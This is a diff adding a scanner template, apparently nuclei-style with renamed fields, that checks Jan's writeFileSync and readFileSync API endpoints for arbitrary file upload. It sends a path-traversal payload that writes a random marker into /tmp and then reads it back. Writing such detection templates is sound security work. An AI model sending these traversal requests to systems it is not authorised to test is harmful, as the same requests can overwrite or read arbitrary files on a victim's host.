@@ -1,0 +1,50 @@
+id: jan-file-upload
+brief:
+    title: Jan - Arbitrary File Upload
+    by: pussycat0x
+    level: high
+    about: Jan's API interface writeFileSync and appendFileSync does not filter parameters, resulting in an arbitrary file upload vulnerability.
+    label:
+        - jan
+        - intrusive
+        - file-upload
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/v1/app/writeFileSync'
+      head:
+        Content-Type: text/plain;charset=UTF-8
+        Origin: '{{RootURL}}'
+        contentType: application/json
+      body: '["/../../../../../tmp/{{string}}.txt","{{randstr}}"]'
+      signs:
+        - "on": word
+          has:
+            - '{{randstr}}'
+          in: body_2
+          need: all
+        - "on": word
+          has:
+            - text/plain
+          in: content_type_2
+          need: all
+    - verb: POST
+      to:
+        - '{{BaseURL}}/v1/app/readFileSync'
+      head:
+        Content-Type: text/plain;charset=UTF-8
+        Origin: '{{RootURL}}'
+        contentType: application/json
+      body: '["file:/../../../../../tmp/{{string}}.txt","utf-8"]'
+      signs:
+        - "on": word
+          has:
+            - '{{randstr}}'
+          in: body_2
+          need: all
+        - "on": word
+          has:
+            - text/plain
+          in: content_type_2
+          need: all
